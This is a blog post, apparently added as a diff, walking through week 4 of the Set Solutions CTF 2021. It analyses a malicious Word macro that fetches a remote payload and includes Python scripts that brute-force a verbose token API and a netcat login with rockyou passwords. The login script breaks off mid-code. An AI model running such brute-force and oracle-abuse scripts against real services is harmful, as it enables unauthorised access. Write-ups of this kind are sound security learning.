@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="Adin Drabkin">
+    <meta name="description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 3 With a total of seven challenges, week 4 proved to be the hardest yet most entertaining week of Set Solutions CTF 2021.">
+    <meta name="keywords" content="">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Set Solutions CTF 2021 Week 4"/>
+<meta name="twitter:description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 3 With a total of seven challenges, week 4 proved to be the hardest yet most entertaining week of Set Solutions CTF 2021."/>
+
+    <meta property="og:title" content="Set Solutions CTF 2021 Week 4" />
+<meta property="og:description" content="Quick Navigation
+Week 1 \ Week 2 \ Week 3 With a total of seven challenges, week 4 proved to be the hardest yet most entertaining week of Set Solutions CTF 2021." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://adindrabkin.com/blog/set-solutions-ctf-2021-week4/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2021-12-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-12-09T00:00:00+00:00" />
+
+
+    <title>
+  Set Solutions CTF 2021 Week 4 · Adin Drabkin
+</title>
+
+    
+      <link rel="canonical" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week4/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.7b314bd953f9bf97050dc5a58a3bc9cea394b9438d373447ddfe7365d5efe091.css" integrity="sha256-ezFL2VP5v5cFDcWlijvJzqOUuUONNzRH3f5zZdXv4JE=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.ccbbada2e264e4fdbf9b2181cccc2cdb289a63dc9520a1e96ac2b9a45778df29.css" integrity="sha256-zLutouJk5P2/myGBzMws2yiaY9yVIKHpasK5pFd43yk=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.111.3">
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-auto">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Adin Drabkin
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/" >Home</a>
+          </li>
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/" >About</a>
+          </li>
+        
+        
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/blog/" >Blog</a>
+          </li>
+        
+      
+        
+    </ul>
+  
+</section>
+</nav>
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://adindrabkin.com/blog/set-solutions-ctf-2021-week4/">
+          Set Solutions CTF 2021 Week 4
+        </a>
+      </h1>
+    </header>
+
+    <p><strong>Quick Navigation</strong><br>
+<a href="/blog/set-solutions-ctf-2021-week1">Week 1</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week3">Week 3</a>
+</p>
+<p>With a total of seven challenges, week 4 proved to be the hardest yet most entertaining week of Set Solutions CTF 2021.</p>
+<h1 id="top-secret">
+  TOP SECRET
+  <a class="heading-link" href="#top-secret">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>We can neither confirm, nor deny&hellip;</p>
+</blockquote>
+<p>Challenge attachment: <code>TOP_SECRET</code></p>
+<p>Week 4 started with a 2 MB file <em>TOP SECRET</em>, which the unix command <em>file</em> revealed to be a <em>Composite Document File V2 Document</em> (CDF document) created by Microsoft Office Word. Opening with Microsoft Word prompts a macro warning, which I politely declined. Near the bottom of the document, there was white (invisible) text which said:</p>
+<blockquote>
+<p>The secret to fixing the payload, is you will need to update the DNS A Record to point to 3.137.116.245</p>
+</blockquote>
+<p>The Python tool <em>olevba</em> revealed that, should you enable macros, a PowerShell command would download and attempt to execute a file hosted on <code>exploit.sociosploit.com</code>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SecretOleVBA.jpg"/>
+</figure>
+
+<p>Rather than adding a DNS record for <code>exploit.sociosploit.com</code> as the Word document suggested, I directly browsed to <code>http://3.137.116.245/...</code> , which revealed the flag.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SecretFlag.jpg"/>
+</figure>
+
+<h1 id="black-holes">
+  Black Holes
+  <a class="heading-link" href="#black-holes">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>The commander is asking for the average Cluster Mass of black holes from the dataset provided (rounded to the nearest whole number).</p>
+</blockquote>
+<p>Challenge attachment: <code>blackHoles.bin</code></p>
+<p><em>Black Holes</em> provided a dataset, <em>blackHoles.bin</em>, and a prompt to enter the average cluster mass of black holes, given the dataset. The binary data of <em>blackHoles.bin</em> started with &ldquo;&hellip;cpandas.core.frame.DataFrame&rdquo;, meaning that the challenge literally provided a dataset and wanted calculations to be performed.</p>
+<p>I launched <em>ipython</em> and imported <em>pandas</em>. From previous work with Pandas, I knew that Python datasets were typically saved using <em>Pickle</em>, a library which allows for python objects to be easily (but insecurily) saved/loaded. To load and describe <em>blackHoles.bin</em>, I executed the following commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> pandas
+</span></span><span style="display:flex;"><span>d = pandas.read_pickle(<span style="color:#0ff;font-weight:bold">&#34;blackHoles.bin&#34;</span>)
+</span></span><span style="display:flex;"><span>d.describe()
+</span></span></code></pre></div><figure class="centered"><img src="/images/blog/SetSolutionsWeek4/BlackHolesDescribe.jpg"/>
+</figure>
+
+<p>To determine if there was a column related to the cluster mass of black holes, I executed the command <code>d.columns()</code>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/BlackHolesColumns.jpg"/>
+</figure>
+
+<p>There was indeed a column named &ldquo;Cluster Mass&rdquo;! To retrieve the mean of &ldquo;Cluster Mass&rdquo; I used the command <code>d['Cluster Mass'].mean()</code>, which rounded to <em>124605</em>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/BlackHolesClusterMassMean.jpg"/>
+</figure>
+
+<h1 id="target-destinations">
+  Target Destinations
+  <a class="heading-link" href="#target-destinations">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>18.116.106.205</p>
+</blockquote>
+<p><em>Target Destinations</em> simply provided the IP address of another EC2 instance. After many hours of troubleshooting why my port scans were unable to find anything, I attempted a full syn port scan from another IP address. Within a few seconds, port 25443 was revealed to be open, and the flag was printed upon connection.</p>
+<h1 id="dr-mallory">
+  Dr Mallory
+  <a class="heading-link" href="#dr-mallory">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>Dr. Mallory has sent out a double encrypted email to an external address. Could he be the spy?</p>
+</blockquote>
+<p>Challenge attachment: <code>authenticate.exe</code></p>
+<p>Dr Mallory provided the attachment <em>authenticate.exe</em>, a 73 MB Windows executable.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/MalloryAuthenticate.jpg"/>
+</figure>
+
+<p>Running <em>authenticate.exe</em> from the command line on a Windows virtual machine resulted in password prompt usage being displayed.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/MalloryUsage.jpg"/>
+</figure>
+
+<p>After poking around the results of <code>strings authenticate.exe</code>, I switched to the more tactical approach of searching for important strings, such as the prompt for the challenge &ldquo;Instructions - &ldquo;, hoping for context to be stored nearby.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/MalloryStringsGrep.jpg"/>
+</figure>
+
+<p>Exactly 10 lines of strings above &ldquo;Instructions -&rdquo; was the suspicious base64 string &ldquo;SUQxZFRoM0JydXQzRjByYzNFbmMwZDFuZw==&rdquo;, which decoded to &ldquo;ID1dTh3Brut3F0rc3Enc0d1ng&rdquo;.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/MalloryBase64Decode.jpg"/>
+</figure>
+
+<h1 id="coin-challenge">
+  Coin Challenge
+  <a class="heading-link" href="#coin-challenge">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>So, you got a challenge coin from us at HOU.SEC.CON 2021. We hid an extra flag out on the internet. Take a close look at the coin, after a few twists and flips, it will lead you to the flag.</p>
+</blockquote>
+<p>Challenge image: <code>ssi_coins.png</code></p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinCoins.jpg"/>
+</figure>
+
+<p>Immediately, I noticed the significant number of 1&rsquo;s and 0&rsquo;s on the right image of the coin. The numbers were not consistent with 5-bit binary, and attempts to decode the message using ciphers such as Baudot-Murray Code did not yield promising results.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinBaudot.jpg"/>
+</figure>
+
+<p>Like other challenges, stenography of the image and OSINT of HOU.SEC.CON revealed nothing. Stumped, I went back to probing google for portions of &ldquo;11000 00111 00000 00111 00001 11110 10000 1010 00001 11000 11000 11110 10000 100 00011 00001 11000 00111 00011 00011 00000 01111&rdquo;, hoping for ideas. On the second page of google, documentation for a Morse Code generator for the Raspberry Pi caught my eye.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinMorseCodeGoogle.jpg"/>
+</figure>
+
+<p>Scrolling down the Raspberry Pi documentation, I discovered sample Morse Code python code, meant to be used on the Raspberry Pi.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinRaspberryPiCode.jpg"/>
+</figure>
+
+<p>Noticing the similarity in the format between the Morse Code dictionary and the sequence of binary numbers provided, I pasted the dictionary into <em>ipython</em>, reversed the keys and values, and mapped each binary &ldquo;word&rdquo; to its corresponding letter in the Morse Code dictionary . The result was &ldquo;7252496c47796d34723351&rdquo;, a sequence of hex values. Converting &ldquo;7252496c47796d34723351&rdquo; to ASCII revealed &ldquo;rRIlGym4r3Q&rdquo;, which looked more promising than any other conversion I had completed.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinFromHex.jpg"/>
+</figure>
+
+<p>I searched for &ldquo;rRIlGym4r3Q&rdquo;, hoping that the string was short enough to catch another google result. Luckily, a single result appeared: a youtube video uploaded two months prior to the CTF by Set Solutions, featuring Hutch, the main point of contact for the CTF.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinGoogle.jpg"/>
+</figure>
+
+<p>Not wanting to watch the entirety of the interview (sorry Set Solutions!) I explored the description, and found the flag hiding at the very bottom.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/CoinFlag.jpg"/>
+</figure>
+
+<p>In retrospect, any configurable Morse Code to text tool could solve this challenge. For example, <em>v2.cryptii.com</em> will reveal the hex value &ldquo;7252496c47796d34723351&rdquo;, when the separator is <em>&rdquo; &ldquo;</em>, long is &ldquo;1&rdquo; and short is &ldquo;0&rdquo;.</p>
+<p>Also in retrospect, I happened to be very lucky when transcribing the binary on the coin, as I started from the top center (imagine 12 o&rsquo;clock if the coin was a clock). As a result, when I decoded the morse code, I retrieved characters of the youtube video ID in the correct order. Without the order being correct, I would have not found the video from a google search. Again in retrospect, there are multiple hints pointing to that the binary should be read from the top center, including the arrow on the coin pointing at the first character.</p>
+<h1 id="man-down">
+  Man Down
+  <a class="heading-link" href="#man-down">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>The commander over-heated while running with his space-suit on in the desert surrounding the moon-base simulation. We need to figure out the combo to get into the medical locker.</p>
+</blockquote>
+<p><em>Man Down</em> contained an input box for the &ldquo;Medical Supplies Cache&rdquo;, which required a text token. The token was sent in a GET request to an AWS endpoint, and a JSON response would was returned.</p>
+<p>Upon submitting an empty token, I received a response noting that the token I submitted was not the correct length. I decided to manually enumerate the the token length by appending &ldquo;a&rdquo; until the repsonse changed from <em>Incorrect Length</em> to <em>Incorrect Token</em>. After about thirty seconds of manually appending characters to the token, the length of 24 returned the response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f00">&#39;status&#39;:</span> <span style="color:#f00">&#39;FAIL&#39;,</span> <span style="color:#f00">&#39;response&#39;:</span> <span style="color:#f00">&#39;Incorrect</span> <span style="color:#f00">Token&#39;,</span> <span style="color:#f00">&#39;correctChars&#39;:</span> <span style="color:#f00">0,</span> <span style="color:#f00">&#39;correctPos&#39;:</span> <span style="color:#f00">0</span>}
+</span></span></code></pre></div><p>Rather than brute forcing the entire string, I took advantage of the token endpoint&rsquo;s verbosity, and wrote a script to determine how many of which characters the token consisted of.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL = <span style="color:#0ff;font-weight:bold">&#34;https://8dny1av8tk.execute-api.us-east-2.amazonaws.com/passPhrase?token=&#34;</span>
+</span></span><span style="display:flex;"><span>LENGTH = <span style="color:#ff0;font-weight:bold">24</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars = {}
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> c in string.printable:
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span>        r = requests.get(URL + (c * LENGTH))
+</span></span><span style="display:flex;"><span>        correct_chars = r.json()[<span style="color:#0ff;font-weight:bold">&#39;correctChars&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> correct_chars != <span style="color:#ff0;font-weight:bold">0</span>:
+</span></span><span style="display:flex;"><span>        chars[c] = correct_chars
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] Correct: </span><span style="color:#0ff;font-weight:bold">{</span>c<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> (</span><span style="color:#0ff;font-weight:bold">{</span>correct_chars<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;correct chars:</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">{</span>chars<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#0ff;font-weight:bold">&#39;Q&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;R&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;J&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;8&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;D&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;E&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;B&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;t&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;N&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;y&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;o&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;e&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;O&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;m&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;v&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;c&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;G&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;n&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;X&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;j&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;H&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;4&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;f&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;Z&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>}
+</span></span></code></pre></div><p>Next, I wrote a script to brute-force the flag, using the characters previously discovered. I did not have to worry about modifying or checking the count of each character, as each character only appeared once.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL = <span style="color:#0ff;font-weight:bold">&#34;https://8dny1av8tk.execute-api.us-east-2.amazonaws.com/passPhrase?token=&#34;</span>
+</span></span><span style="display:flex;"><span>LENGTH = <span style="color:#ff0;font-weight:bold">24</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chars = {<span style="color:#0ff;font-weight:bold">&#39;8&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;O&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;X&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;4&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;R&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;t&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;y&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;Z&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;D&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;f&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;o&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;J&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;G&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;v&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;B&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;E&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;e&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;N&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;c&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;m&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;j&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;H&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;n&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>, <span style="color:#0ff;font-weight:bold">&#39;Q&#39;</span>: <span style="color:#ff0;font-weight:bold">1</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token = <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> _ in <span style="color:#fff;font-weight:bold">range</span>(LENGTH):
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span> c in chars.copy():
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># create test token + fill with known incorrect character</span>
+</span></span><span style="display:flex;"><span>        cur_token = token + c + ((LENGTH - <span style="color:#fff;font-weight:bold">len</span>(token + c)) * <span style="color:#0ff;font-weight:bold">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] trying </span><span style="color:#0ff;font-weight:bold">{</span>cur_token<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>        r = requests.get(URL + cur_token)
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> r.json()[<span style="color:#0ff;font-weight:bold">&#39;status&#39;</span>] == <span style="color:#0ff;font-weight:bold">&#39;SUCCESS&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] SUCCESS! </span><span style="color:#0ff;font-weight:bold">{</span>r.json()<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">break</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">elif</span> r.json()[<span style="color:#0ff;font-weight:bold">&#39;correctPos&#39;</span>] == (<span style="color:#fff;font-weight:bold">len</span>(token) + <span style="color:#ff0;font-weight:bold">1</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] correct found </span><span style="color:#0ff;font-weight:bold">{</span>c<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>                token += c
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">del</span>(chars[c])
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[!] exception!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(r.json())
+</span></span></code></pre></div><p>The brute-force script eventually reached the correct token, and the API endpoint returned the flag!</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/ManDownFlag.jpg"/>
+</figure>
+
+<p><em>Note: the scripts shown were modified versions of what was used during the challenge, for clarity purposes</em></p>
+<h1 id="spacefaq">
+  SpaceFAQ
+  <a class="heading-link" href="#spacefaq">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Challenge description:</p>
+<blockquote>
+<p>What do you do, when you don&rsquo;t know what to do? You ask the FAQ of course. Connectivity is limited on the moon, so the system is kind of simple, and very strange, but there are answers and a flag to be found.<br>
+<br>
+connect to the range at 3.14.173.61 on port 1337</p>
+</blockquote>
+<p>Challenge image:
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQ.jpg"/>
+</figure>
+</p>
+<p>SpaceFAQ was by far the most difficult challenge of the Set Solutions CTF. For context, the top three winners for the previous three weeks were decided within two days of the challenges being released.</p>
+<p>Upon connecting with netcat to <code>3.14.173.61 1337</code>, a welcome message was printed, and a prompt for a username and password appeared.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQWelcome.jpg"/>
+</figure>
+
+<p>Early on in day one, I unsuccessfully attempted to brute-force the login prompt with username &ldquo;eddie&rdquo; and the first ~6000 passwords from <em>rockyou.txt</em>. The following script was used to brute-force the netcat-compatible login prompt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> remote
+</span></span><span style="display:flex;"><span>HOST = <span style="color:#0ff;font-weight:bold">&#34;3.14.173.61&#34;</span>
+</span></span><span style="display:flex;"><span>PORT = <span style="color:#ff0;font-weight:bold">1337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER = <span style="color:#0ff;font-weight:bold">&#34;eddie&#34;</span>
+</span></span><span style="display:flex;"><span>conn = remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> try_login(username, password):
+</span></span><span style="display:flex;"><span>    conn.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;): &#34;</span>.encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\t</span><span style="color:#0ff;font-weight:bold">{</span><span style="color:#fff;font-weight:bold">repr</span>(username)<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\n\t</span><span style="color:#0ff;font-weight:bold">{</span><span style="color:#fff;font-weight:bold">repr</span>(password)<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>    conn.send((username + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>).encode())
+</span></span><span style="display:flex;"><span>    conn.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;Password: &#34;</span>.encode())
+</span></span><span style="display:flex;"><span>    conn.send((password + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>).encode())
+</span></span><span style="display:flex;"><span>    r = conn.recv(<span style="color:#ff0;font-weight:bold">2048</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#0ff;font-weight:bold">&#34;Are you even a member of the crew? Try again.&#34;</span> not in r.decode()):
